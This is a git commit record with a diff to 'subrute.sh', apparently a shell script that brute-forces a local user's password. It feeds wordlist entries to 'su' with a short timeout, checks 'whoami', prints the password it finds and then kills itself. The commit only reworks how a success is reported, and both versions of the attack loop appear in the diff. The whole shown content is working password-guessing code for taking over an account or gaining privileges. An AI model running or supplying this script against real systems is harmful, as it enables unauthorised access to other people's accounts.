b0d68f4dba2a27d23f67237556b2e8c3906d2b63
Sublarge <72176308+yanxinwu946@users.noreply.github.com>
2026-05-22 10:07:09 +0800

    Update subrute.sh

--- subrute.sh
+++ subrute.sh
@@ -8,8 +8,10 @@ while IFS= read -r p; do
     C=$((C + 1))
     printf "\r\033[K[*] Progress: [%d/%d] %s" "$C" "$T" "$p"
     
-    (echo "$p" | timeout 0.2 su "$U" -c "whoami" 2>/dev/null | grep -q "$U") && \
-    printf "\n[+] FOUND => %s\n" "$p" && kill -9 $$ &
+    (echo "$p" | timeout 0.2 su "$U" -c "whoami" 2>/dev/null | grep -q "$U") 2>/dev/null && {
+        printf "\n[+] FOUND => %s\n" "$p"
+        kill -9 $$
+    } &
 
     [ $((C % 16)) -eq 0 ] && wait
 done < "$D"
